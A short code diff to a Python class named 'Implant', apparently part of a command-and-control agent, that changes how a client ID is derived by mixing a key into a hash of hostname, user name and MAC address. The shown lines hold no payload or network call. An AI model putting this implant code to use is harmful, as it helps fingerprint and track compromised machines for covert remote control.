@@ -58,12 +58,12 @@ class Implant:
         self.processed_seqs = set()
 
     def _get_client_id(self) -> str:
-        """Generate a stable client ID from hostname+user+MAC."""
+        """Derive unique client ID from key + machine identity."""
         import uuid
         hostname = socket.gethostname()
         user = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
         mac = format(uuid.getnode(), '012x')
-        seed = f"{hostname}|{user}|{mac}"
+        seed = f"{self.key}|{hostname}|{user}|{mac}"
         return format(zlib.adler32(seed.encode()) & 0xFFFFFFFF, '08x')
 
     def _send_checkin(self):
